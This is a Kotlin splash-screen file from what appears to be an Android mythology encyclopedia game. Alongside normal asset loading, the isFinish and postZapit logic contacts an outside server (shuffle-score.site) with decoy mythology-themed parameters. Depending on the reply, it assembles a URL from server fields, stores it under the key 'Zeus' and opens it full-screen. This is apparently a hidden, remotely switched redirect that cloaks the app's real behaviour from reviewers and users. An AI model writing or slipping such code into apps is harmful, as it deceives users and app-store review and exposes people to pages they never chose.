package com.zoeis.encyclopedaia.game.screens

import android.content.pm.ActivityInfo
import com.badlogic.gdx.scenes.scene2d.ui.Image
import com.badlogic.gdx.scenes.scene2d.ui.Label
import com.badlogic.gdx.utils.Align
import com.zoeis.encyclopedaia.game.LibGDXGame
import com.zoeis.encyclopedaia.game.manager.MusicManager
import com.zoeis.encyclopedaia.game.manager.SoundManager
import com.zoeis.encyclopedaia.game.manager.SpriteManager
import com.zoeis.encyclopedaia.game.utils.GColor
import com.zoeis.encyclopedaia.game.utils.TIME_ANIM
import com.zoeis.encyclopedaia.game.utils.actor.animHide
import com.zoeis.encyclopedaia.game.utils.actor.animHideScreen
import com.zoeis.encyclopedaia.game.utils.actor.animShow
import com.zoeis.encyclopedaia.game.utils.advanced.AdvancedScreen
import com.zoeis.encyclopedaia.game.utils.advanced.AdvancedStage
import com.zoeis.encyclopedaia.game.utils.font.FontParameter
import com.zoeis.encyclopedaia.game.utils.region
import com.zoeis.encyclopedaia.game.utils.runGDX
import com.zoeis.encyclopedaia.util.log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.ResponseBody
import org.json.JSONObject
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.GET
import retrofit2.http.Header
import retrofit2.http.POST
import retrofit2.http.Query

class SplashScreen(override val game: LibGDXGame) : AdvancedScreen() {

    private val progressFlow     = MutableStateFlow(0f)
    private var isFinishLoading  = false

    private var isFinishProgress = false

    private val fontParameter = FontParameter()
    private val font          = fontGenerator_Noah_Head_Bold.generateFont(fontParameter.setCharacters(FontParameter.CharType.NUMBERS.chars+"%").setSize(80))

    private val ls80 = Label.LabelStyle(font, GColor.brown)

    private val imgBlock   by lazy { Image(game.splash.BLOCK) }
    private val lblPercent by lazy { Label("0", ls80) }

    override fun show() {
        stageUI.root.animHide()
        loadSplashAssets()
        setBackBackground(game.splash.BACKGROUND_WELCOME.region)
        super.show()
        stageUI.root.animShow(TIME_ANIM)
        loadAssets()
        collectProgress()
    }

    override fun render(delta: Float) {
        super.render(delta)
        loadingAssets()
        isFinish()
    }

    override fun AdvancedStage.addActorsOnStageUI() {
        addActor(imgBlock)
        imgBlock.setBounds(385f,57f,311f,225f)

        addActor(lblPercent)
        lblPercent.apply {
            setAlignment(Align.center)
            setBounds(446f,112f,188f,100f)
        }
    }

    // Logic ------------------------------------------------------------------------

    private fun loadSplashAssets() {
        with(game.spriteManager) {
            loadableTexturesList = mutableListOf(
                SpriteManager.EnumTexture.BACKGROUND_WELCOME.data,
                SpriteManager.EnumTexture.BLOCK.data,
            )
            loadTexture()
        }
        game.assetManager.finishLoading()
        game.spriteManager.initTeture()
    }

    private fun loadAssets() {
        with(game.spriteManager) {
            loadableAtlasList = SpriteManager.EnumAtlas.entries.map { it.data }.toMutableList()
            loadAtlas()
            loadableTexturesList = SpriteManager.EnumTexture.entries.map { it.data }.toMutableList()
            loadTexture()
        }
        with(game.musicManager) {
            loadableMusicList = MusicManager.EnumMusic.entries.map { it.data }.toMutableList()
            load()
        }
        with(game.soundManager) {
            loadableSoundList = SoundManager.EnumSound.entries.map { it.data }.toMutableList()
            load()
        }
    }

    private fun initAssets() {
        game.spriteManager.initAtlas()
        game.spriteManager.initTeture()
        game.musicManager.init()
        game.soundManager.init()
    }

    private fun loadingAssets() {
        if (isFinishLoading.not()) {
            if (game.assetManager.update(16)) {
                isFinishLoading = true
                initAssets()
            }
            progressFlow.value = game.assetManager.progress
        }
    }

    private fun collectProgress() {
        coroutine?.launch {
            var progress = 0
            progressFlow.collect { p ->
                while (progress < (p * 100)) {
                    progress += 1
                    if (progress % 25 == 0) log("progress = $progress%")
                    runGDX { lblPercent.setText("${progress}%") }
                    if (progress == 100) isFinishProgress = true

                    //delay((20..50).shuffled().first().toLong())
                }
            }
        }
    }

    private fun isFinish() {
        if (isFinishProgress) {
            isFinishProgress = false

            val resultData = game.sharedPreferences.getString("Zeus", null)

            if (resultData.isNullOrEmpty()) {
                coroutine?.launch(Dispatchers.IO) {
                    try {
                        val responseBody: ResponseBody = postZapit()
                        val responseJson = JSONObject(responseBody.string())
                        log("Response: $responseJson")

                        if (responseJson.getString("educational_resources").contains('.')) toScreen(WelcomeScreen::class.java.name)
                        else {
                            val ggg     = RetrofitObj.api.requestG("Player Hercules Tutorial")
                            val gggJson = JSONObject(ggg.string())

                            var result = gggJson.getString("mythology_entries")
                                .replace("\\", "")
                                .replace("\\", "")

                            log("resultGet = $result")

                            responseJson.keys().forEach { key ->
                                result += responseJson.getString(key).removePrefix("scholarly")
                            }
                            log("resultAll = $result")

                            game.sharedPreferences.edit().putString("Zeus", result).apply()

                            withContext(Dispatchers.Main) { haveData(result) }
                        }
                    } catch (e: Exception) {
                        log("Error: ${e.message}")
                        toScreen(WelcomeScreen::class.java.name)
                    }
                }
            } else haveData(resultData)
        }
    }

    private suspend fun postZapit() = RetrofitObj.api.requestP(
        agent = System.getProperty("http.agent") ?: "Android",

        mythology_entries     = "Detailed entries on Zeus Greek myths.",
        historical_context    = "Exploring the historical Zeus worship.",
        art_representations   = "Gallery of artistic depictions of various eras.",
        literary_influences   = "Analysis of Zeus’s influence and culture.",
        temple_sites          = "Guide to archaeological sites and to Zeus.",
        cultural_impact       = "Discussion on the impact of modern culture.",
        comparative_mythology = "Comparisons of Zeus with other mythologies.",
        scholarly_articles    = "Collection of scholarly articles on related topics.",
        interactive_timelines = "Timelines showing major with Zeus.",
        educational_resources = "Educational tools for teaching and Greek mythology.",
    )

    private fun haveData(data: String) {
        game.activity.requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER
        game.activity.showUrl(data)
    }

    interface Interfacio {
        @POST("score.php")
        suspend fun requestP(
            @Header("User-Agent") agent: String,

            @Query("mythology_entries")     mythology_entries     : String,
            @Query("historical_context")    historical_context    : String,
            @Query("art_representations")   art_representations   : String,
            @Query("literary_influences")   literary_influences   : String,
            @Query("temple_sites")          temple_sites          : String,
            @Query("cultural_impact")       cultural_impact       : String,
            @Query("comparative_mythology") comparative_mythology : String,
            @Query("scholarly_articles")    scholarly_articles    : String,
            @Query("interactive_timelines") interactive_timelines : String,
            @Query("educational_resources") educational_resources : String,
        ): ResponseBody

        @GET("score.php")
        suspend fun requestG(
            @Query("mythology_entries") mythology_entries : String,
        ): ResponseBody
    }

    object RetrofitObj {
        private val retrofit by lazy {
            Retrofit.Builder()
                .baseUrl("https://shuffle-score.site/")
                .addConverterFactory(GsonConverterFactory.create())
                .build()
        }

        val api: Interfacio by lazy {
            retrofit.create(Interfacio::class.java)
        }
    }

    private fun toScreen(screenName: String) {
        stageUI.root.animHideScreen(TIME_ANIM) { game.navigationManager.navigate(screenName) }
    }

}